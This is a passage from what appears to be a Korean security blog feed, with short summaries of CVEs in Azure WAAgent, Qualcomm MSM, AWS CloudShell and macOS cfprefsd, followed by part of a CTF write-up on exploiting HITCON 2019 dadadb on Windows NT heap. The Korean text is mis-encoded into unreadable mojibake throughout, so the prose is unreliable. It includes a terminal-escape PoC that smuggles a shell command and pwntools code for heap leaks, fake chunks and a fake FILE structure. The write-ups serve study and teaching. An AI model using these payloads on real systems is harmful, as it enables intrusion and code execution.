€ì¥ë˜ì–´ ìˆì–´ rootê°€ ì•„ë‹Œ ì‚¬ìš©ìëŠ” ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><p>í™•ì¥ í”„ë¡œê·¸ë¨ì´ VMì— ì¶”ê°€ë˜ë©´ ì„¤ì • íŒŒì¼ì€ Azure VM Managerì¸ Fabric Controllerì— ì˜í•´ ì—…ë°ì´íŠ¸ë©ë‹ˆë‹¤. WAAgentê°€ Fabric Controllerì—ì„œ ì´ íŒŒì¼ì„ ë°›ì•„ì™€ì„œ ì—…ë°ì´íŠ¸í•˜ê³  í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì„¤ì¹˜í•˜ê³  deploy í•©ë‹ˆë‹¤. WAAgentëŠ” Fabric Controllerì™€ íŠ¹ì • IP ì£¼ì†Œ(168.63.129.16)ë¥¼ í†µí•´ í†µì‹ í•©ë‹ˆë‹¤. ExtensionConfig íŒŒì¼ì˜ ì—”ë“œ í¬ì¸íŠ¸ Responseì—ëŠ” ê°œì¸ í‚¤ì™€ ê°™ì€ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©° í‚¤ëŠ” <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.prv</code>ì— ì €ì¥ë˜ê³  ì¸ì¦ì„œëŠ” <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.crt</code>ì— ì €ì¥ë©ë‹ˆë‹¤. ExtensionConfig íŒŒì¼ì— í‚¤ì™€ ì¸ì¦ì„œê°€ í¬í•¨ë˜ì–´ ìˆì§€ ì•Šìœ¼ë¯€ë¡œ í™•ì¥ í”„ë¡œê·¸ë¨ì„ deploy í•  ë•Œ Wire Serverì™€ í†µì‹ í•˜ì—¬ Certificates endpointë¥¼ ì‚¬ìš©í•˜ëŠ”ë° ì´ë•Œ ì „ì†¡ëœ ì¸ì¦ì„œì— ëŒ€í•œ ê²€ì¦ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ì •ë³´ ìœ ì¶œì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ì»¤ê°€ ìì‹ ì˜ ê°œì¸ í‚¤ì™€ ì¸ì¦ì„œë¥¼ ë§Œë“¤ì–´ ê·¸ë¥¼ í†µí•´ Wire Serverì— ì•”í˜¸í™”ëœ í‚¤ë¥¼ ìˆ˜ì‹ í•©ë‹ˆë‹¤. Transport Keyë¥¼ í†µí•´ ì•”í˜¸í™”ëœ í‚¤ë¥¼ ë³µí˜¸í™”í•˜ì—¬ ExtensionConfigì˜ <code>protectedSettings</code>ë¥¼ ì½ì–´ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ Azure Instance Metadata Serviceì¸ 169.254.169.254ì™€ì˜ í†µì‹ ì„ í†µí•´ 168.63.129.16ì— í•„ìš”í•œ root ê¶Œí•œ ì—†ì´ Wire Serverì™€ í†µì‹ í•˜ì—¬ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>azure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-11292: ì•ˆë“œë¡œì´ë“œ ê¸°ê¸°ë¥¼ ë„ì²­í•  ìˆ˜ ìˆëŠ” Qualcomm ì¹© ì·¨ì•½ì </title>
    <link href="/2021/05/12/fabu1ous/2021-05-12/"/>
    <url>/2021/05/12/fabu1ous/2021-05-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/security-probe-of-qualcomm-msm/">Security probe of Qualcomm MSM data services</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm MSM<br>issue: QPSIIR-1441</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Researchê°€ Qualcommì˜ MSM(Mobile Station Modem) data serviceì—ì„œ ë°œê²¬ëœ heap overflow ì·¨ì•½ì ì„ ê³µê°œí–ˆìŠµë‹ˆë‹¤. ì´ë²ˆì— ê³µê°œëœ write-upì—ì„œ ì£¼ëª©í•  ì ì€ QMI(Qualcomm MSM Interface)ê°€ MSM ìµìŠ¤í”Œë¡œì‡ì˜ ê³µê²© ë²¡í„°ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆë‹¤ëŠ” ì ì…ë‹ˆë‹¤. MSMì€ QuRT(Qualcomm real-time OS)ì˜ ê´€ë¦¬ë¥¼ ë°›ì•„ ë£¨íŒ… ëœ ì•ˆë“œë¡œì´ë“œ ê¸°ê¸°ì—ì„œë„ ë””ë²„ê¹…ì´ë‚˜ ë©”ëª¨ë¦¬ ë¤í•‘ì´ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ MSMì˜ ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ìš”ì†Œì™€ ì£¼ë³€ ì„œë¸Œì‹œìŠ¤í…œ ê°„ì˜ í†µì‹ ì„ ë‹´ë‹¹í•˜ëŠ” QMIë¥¼ í†µí•´ data serviceë¥¼ ê³µê²©í•˜ê³  QuRTë¥¼ (ì•…ì„±ì½”ë“œë¡œ) íŒ¨ì¹˜í•˜ëŠ” ê²ƒì´ Check Point Researchê°€ ì œì‹œí•œ ë°©ë²•ì…ë‹ˆë‹¤.</p><ul><li><p>CVE-2020-11292</p><p>QMIì— ì „ë‹¬ë˜ëŠ” ìœ ì € ì œê³µ ë°ì´í„°ì˜ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ heap overflowê°€ ë°œìƒí•©ë‹ˆë‹¤. í•¸ë“¤ëŸ¬ í•¨ìˆ˜ <code>qmi_voicei_srvcc_call_config_req</code>ëŠ” ì•ˆë“œë¡œì´ë“œë¡œë¶€í„° ë°›ì€ QMI ë©”ì„¸ì§€ë¥¼ íŒŒì‹±í•©ë‹ˆë‹¤. QMI ë©”ì„¸ì§€ì—ì„œ TLV payloadë¥¼ íŒŒì‹± í•  ë•Œ <code>TLV packet type</code>ê°’ ë§Œí¼ ë£¨í”„ë¥¼ ëŒë©° í™ ë©”ëª¨ë¦¬ì— í˜¸ì¶œ ì½˜í…ìŠ¤íŠ¸ë¥¼ ì˜®ê¸°ëŠ”ë° í•´ë‹¹ ë£¨í”„ íšŒìˆ˜ì˜ ìµœëŒ“ê°’ ê²€ì¦ì´ ì—†ì–´ overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</p></li></ul><p>MSMì€ Qualcomì—ì„œ ì œì‘í•œ SoC(System on Chip)ì´ë©°, í˜„ì¬ ìŠ¤ë§ˆíŠ¸í°ì˜ 30%ê°€ëŸ‰ì´ í•´ë‹¹ MSM ì¹©ê³¼ QMIë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤. í•´ì»¤ê°€ ìœ„ì™€ ê°™ì€ ì·¨ì•½ì ì„ ì•…ìš©í•œë‹¤ë©´ MSMë¥¼ ì œì–´í•  ìˆ˜ ìˆìœ¼ë©° ëª¨ë€ì— ì•…ì„±ì½”ë“œë¥¼ ì‹¬ì–´ë†“ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ í•´ì»¤ëŠ” ê¸°ê¸°ì˜ SMS ê¸°ë¡ ë° í†µí™” ë„ì²­ì„ í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] AWS CloudShell terminal escape injection ì·¨ì•½ì </title>
    <link href="/2021/05/11/l0ch/2021-05-11/"/>
    <url>/2021/05/11/l0ch/2021-05-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2154">Issue 2154: Terminal escape injection in AWS CloudShell</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AWS Management Consoleì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ë¸Œë¼ìš°ì € ê¸°ë°˜ ì‰˜ì¸ AWS CloudShellì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ AWS CloudShellì˜ <code>aceterm</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ <a href="https://xtermjs.org/docs/api/vtfeatures/">DCS(Device Control String)</a> ì´ìŠ¤ì¼€ì´í”„ ë¬¸ìë¥¼ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì— ì¡´ì¬í•©ë‹ˆë‹¤. </p><pre><code class="hljs python">case <span class="hljs-string">&#x27;+q&#x27;</span>:var pt = this.currentParam, valid = false;this.send(<span class="hljs-string">&#x27;\x1bP&#x27;</span> + +valid + <span class="hljs-string">&#x27;+r&#x27;</span> + pt + <span class="hljs-string">&#x27;\x1b\\&#x27;</span>);<span class="hljs-keyword">break</span>;</code></pre><p><code>echo -ne &#39;\eP+q6b64\e\\&#39;</code> ì„ ì…ë ¥í•˜ëŠ” ê²½ìš° ìœ„ ì½”ë“œì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì²˜ë¦¬ë©ë‹ˆë‹¤. <code>this.currenParam</code>ì€ <code>\eP+q</code> ì´ìŠ¤ì¼€ì´í”„ ë¬¸ì ë’¤ì— ì˜¤ëŠ” ì„ì˜ì˜ ë¬¸ìì—´ì„ í¬í•¨í•˜ë©° <code>this.send()</code>ì—ì„œ ì´ë¥¼ í„°ë¯¸ë„ ì…ë ¥ í•¸ë“¤ëŸ¬ë¡œ ì „ë‹¬í•˜ëŠ”ë°, ì´ë•Œ ê°œí–‰ì„ í¬í•¨í•œ ì„ì˜ ì½”ë“œë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ ì•…ìš©í•œ í•´ì»¤ê°€ íƒ€ê²Ÿì˜ AWS ì¸ìŠ¤í„´ìŠ¤ì— <code>/tmp/foo</code> íŒŒì¼ì„ ìƒì„±í•˜ëŠ” PoCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">$ echo -e <span class="hljs-string">&quot;echo -ne &quot;</span>abcdef\x1bP+q\ntouch /tmp/foo\n\x1b\n<span class="hljs-string">&quot;&quot;</span> &gt; index.html</code></pre><p>íƒ€ê²Ÿ AWS CloudShellì—ì„œ í•´ì»¤ì˜ <code>index.html</code>ì„ curl ë“±ì˜ íˆ´ë¡œ ì•¡ì„¸ìŠ¤ í•˜ë©´ ì·¨ì•½ì ì´ íŠ¸ë¦¬ê±° ë˜ì–´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>terminal escape injection</tag>
      
      <tag>aws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1815: MacOS ê¸°ë³¸ ì„¤ì •ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/05/10/idioth/2021-05-10/"/>
    <url>/2021/05/10/idioth/2021-05-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.offensive-security.com/offsec/macos-preferences-priv-escalation/?utm_content=165476462&utm_medium=social&utm_source=twitter&hss_channel=tw-134994790">MACOS LOCAL PRIVILEGE ESCALATION VIA PREFERENCES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MacOS &lt; 11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple MacOSì—ì„œ 2020ë…„ íŒ¨ì¹˜ëœ CVE-2020-9839ì˜ ì˜ëª»ëœ ìˆ˜ì •ìœ¼ë¡œ ì¸í•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>2020ë…„ì— ë°œê²¬ëœ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì€ ê¸°ë³¸ ì„¤ì •ì„ ë‹´ë‹¹í•˜ëŠ” <code>cfprefsd</code> í”„ë¡œì„¸ìŠ¤ì— ì¡´ì¬í•©ë‹ˆë‹¤. í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ ì„¤ì •ì„ í•˜ê¸° ìœ„í•´ ì¼ë°˜ ì‚¬ìš©ì ê¶Œí•œìœ¼ë¡œ ë™ì‘í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì™€ ì‹œìŠ¤í…œ ì „ë°˜ì ì¸ ì„¤ì •ì„ ìœ„í•´ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ë™ì‘í•˜ëŠ” ë‘ ê°œì˜ í”„ë¡œì„¸ìŠ¤ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ë‘ í”„ë¡œì„¸ìŠ¤ ëª¨ë‘ <a href="https://developer.apple.com/documentation/xpc">XPC ì—°ê²°</a>ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>CFPrefsCreatePreferencesDirectory</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ <code>cfprefsd</code> ë°ëª¬ì—ì„œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì§€ì • ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•  ë•Œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ëŠ” í•´ë‹¹ í•¨ìˆ˜ì—ì„œì˜ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ë§‰ìŒìœ¼ë¡œì¨ ì„ì˜ ë””ë ‰í„°ë¦¬ì˜ ì†Œìœ ê¶Œ ìˆ˜ì •ì„ ë§‰ì•˜ìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ì—¬ì „íˆ ì‚¬ìš©ìë‚˜ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆì–´ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. MacOSëŠ” ìœ ì§€ ê´€ë¦¬ë¥¼ ìœ„í•´ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì£¼ê¸°ì ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŠ” <code>/etc/defaults/periodic.conf</code>ì— ì •ì˜ë˜ì§€ë§Œ ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸ëŠ” <code>/usr/local/etc/periodic</code>ì— ì €ì¥ë©ë‹ˆë‹¤.</p><p>ê¸°ë³¸ì ìœ¼ë¡œ í•´ë‹¹ ë””ë ‰í„°ë¦¬ëŠ” ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ <code>cfprefsd</code>ë¥¼ í†µí•´ í•´ë‹¹ ë””ë ‰í„°ë¦¬ë¥¼ í•´ì»¤ì˜ ì†Œìœ ë¡œ ìƒì„±í•œ í›„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±í•˜ë©´ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>apple</tag>
      
      <tag>macOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 5 - HITCON 2019 dadadb(2)</title>
    <link href="/2021/05/09/l0ch/pwncoolsexy-part5/"/>
    <url>/2021/05/09/l0ch/pwncoolsexy-part5/</url>
    
    <content type="html"><![CDATA[<h2 id="ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°"><a href="#ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°" class="headerlink" title="ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°"></a>ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°</h2><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 2 - NT Heap</a></p><p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 3 - NT Heap(2)</a></p><p><a href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 4 - HITCON 2019 dadadb</a></p><p>ì•ˆë…•í•˜ì„¸ìš” L0chì…ë‹ˆë‹¤! ì˜¤ëŠ˜ ë“œë””ì–´ ì‹œë¦¬ì¦ˆ ë§ˆì§€ë§‰ ê¸€ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤!</p><p>ì´ì „ ê¸€ì—ì„œ heap overflow - LFH reuse attackìœ¼ë¡œ ìµìŠ¤ì— í•„ìš”í•œ ì£¼ì†Œë“¤ì„ leak í–ˆìœ¼ë‹ˆ ì´ì œ ë‚¨ì€ ê±´ ìµìŠ¤ë¿ì…ë‹ˆë‹¤! ìµìŠ¤ í•˜ë ¤ë©´ ê°ˆ ê¸¸ì´ ë¨¸ë‹ˆ ë°”ë¡œ ë³¸ë¡ ìœ¼ë¡œ ë“¤ì–´ê°€ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="Exploit-scenario"><a href="#Exploit-scenario" class="headerlink" title="Exploit scenario"></a>Exploit scenario</h1><p>ë¡œê·¸ì¸ ì²´í¬ë¥¼ í•˜ëŠ” <code>sub_10D0</code> í•¨ìˆ˜ì—ì„œëŠ” userì™€ passwordë¥¼ ë°›ê³  <code>user.txt</code> íŒŒì¼ì„ ì—´ì–´ ë¹„êµí•œ ë’¤ ë¡œê·¸ì¸ ì„±ê³µ í˜¹ì€ ì‹¤íŒ¨ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled.png" alt="pwncoolsexy-part5/Untitled.png"></p><p>ì…ë ¥í•œ userì™€ passwordê°€ ì €ì¥ë˜ëŠ” bss ì˜ì—­ì„ ë³´ë©´ <code>input_pw+0x20</code> ìœ„ì¹˜ì— íŒŒì¼ í¬ì¸í„°ê°€ ì €ì¥ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë„¤ìš”!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%204.png" alt="pwncoolsexy-part5/Untitled 4.png"></p><p>ê·¸ëŸ°ë° userì™€ passwordë¥¼ ì…ë ¥ë°›ì„ ë•Œ <code>0x20</code> ë§Œí¼ ì…ë ¥ë°›ë„¤ìš”. ê·¸ëŸ¼ íŒŒì¼ í¬ì¸í„°ë¥¼ overwrite í•  ìˆ˜ ìˆê² ì£ ? ì´ë¥¼ ì´ìš©í•´ fake file structureë¥¼ êµ¬ì„±í•˜ë©´ arbitrary writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ëŒ€ëµì ì¸ exploit ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>heap overflowë¡œ bss ì˜ì—­ì— fake chunk ìƒì„±</li><li>fake chunkì— fake file structure êµ¬ì„±</li><li>íŒŒì¼ í¬ì¸í„°ê°€ fake file structureë¥¼ ê°€ë¦¬í‚¤ë„ë¡ overwrite</li><li>arbitrary writeë¡œ return addressë¥¼ rop chain ì£¼ì†Œë¡œ overwrite</li><li>GET FLAG!!</li></ol><p>ì´ì œ ì‹œë‚˜ë¦¬ì˜¤ëŒ€ë¡œ í•˜ë‚˜ì”© ì‚´í´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><h1 id="Control-RIP"><a href="#Control-RIP" class="headerlink" title="Control RIP"></a>Control RIP</h1><p>NT heapì€ ê°™ì€ í¬ê¸°ì˜ í•´ì œëœ chunkë¥¼ <code>ListHints</code>ì—ì„œ double linked listë¡œ ê´€ë¦¬í•©ë‹ˆë‹¤. í•´ì œëœ chunkì˜ data ìœ„ì¹˜ì—ëŠ” <code>fd</code> ì™€ <code>bk</code> ê°€ ì €ì¥ë˜ê³  ê°ê° ì´ì „ chunk, ë‹¤ìŒ chunkë¥¼ ê°€ë¦¬í‚¤ë©° ì´í›„ì— ê°™ì€ í¬ê¸°ë¡œ ì¬ í• ë‹¹í•  ë•Œ <code>ListHints</code>ë¥¼ ì°¸ì¡°í•´ ë¨¼ì € í•´ì œëœ ìˆœì„œëŒ€ë¡œ í• ë‹¹í•©ë‹ˆë‹¤.</p><p><code>A~D</code>ë¥¼ í• ë‹¹í•˜ê³  <code>B</code>ì™€ <code>D</code>ë¥¼ í•´ì œí•œ ë’¤ì˜ ìƒí™©ì„ ê·¸ë¦¼ìœ¼ë¡œ ê°„ë‹¨í•˜ê²Œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤. ë¦¬ëˆ…ìŠ¤ì˜ Heap ê´€ë¦¬ë‘ ë¹„ìŠ·í•œ ë©´ì´ ìˆë„¤ìš”. </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%205.png" alt="pwncoolsexy-part5/Untitled%205.png"></p><p><code>A chunk</code>ì—ì„œ heap overflowë¥¼ íŠ¸ë¦¬ê±°í•˜ë©´ í•´ì œëœ <code>B chunk</code>ì˜ ì£¼ì†Œì™€ <code>header</code>ë¥¼ leakí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs php">add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak B - header, fd, bk, chunk address</span>view(<span class="hljs-string">&#x27;A&#x27;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span></code></pre><p>ì´ì œ <code>user</code>ì™€ <code>pwd</code> ìœ„ì¹˜ì— 2ê°œì˜ fake chunkë¥¼ ë§Œë“œëŠ”ë°, leak í•œ <code>B chunk</code> ì£¼ì†Œì™€ <code>header</code>ë¥¼ ì´ìš©í•´ <code>B chunk</code>ì™€ ì—°ê²°ë˜ë„ë¡ í•©ë‹ˆë‹¤. ì´ë•Œ ê°ê°ì˜ fake chunkì˜ headerì— ê¸°ì¡´ userì™€ passwordë¥¼ í¬í•¨í•´ì•¼ ë¡œê·¸ì¸ ì²´í¬ í•¨ìˆ˜ë¥¼ í†µê³¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  <code>B chunk</code>ì˜ <code>fd</code>ì—ëŠ” ìš°ë¦¬ê°€ ë§Œë“  fake chunkë¥¼ ê°€ë¦¬í‚¤ë„ë¡ overwrite í•˜ë©´ ë˜ê² ë„¤ìš”.</p><pre><code class="hljs php">user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)</code></pre><p>í˜„ì¬ freeëœ chunkë“¤ì˜ double linked listëŠ” ì•„ë˜ ê·¸ë¦¼ê³¼ ê°™ìŠµë‹ˆë‹¤!</p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%206.png" alt="pwncoolsexy-part5/Untitled%206.png"></p><p>ë‹¤ìŒì€ <code>B chunk</code>ì— fake file structureë¥¼ êµ¬ì„±í•  ì°¨ë¡€ì…ë‹ˆë‹¤. File Structureì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">Play with File Structure</a> ìŠ¬ë¼ì´ë“œë¥¼ ì°¸ê³ í•˜ë©´ ë˜ë©° <code>_base</code> í•„ë“œì— ì„ì˜ì˜ ì£¼ì†Œë¥¼ ì“°ëŠ” ê²ƒìœ¼ë¡œ arbitrary writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>_base</code>ì— return addressë¥¼ ì£¼ë©´ ë©ë‹ˆë‹¤!</p><pre><code class="hljs php">cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span></code></pre><p>return addressì—ëŠ” stack baseì—ì„œ <code>call &lt;func&gt;</code> ë‹¤ìŒ instructionì´ ë“¤ì–´ê°€ë¯€ë¡œ <code>write</code> í•¨ìˆ˜ í˜¸ì¶œ ì§í›„ instructionì´ ìˆëŠ”ì§€ 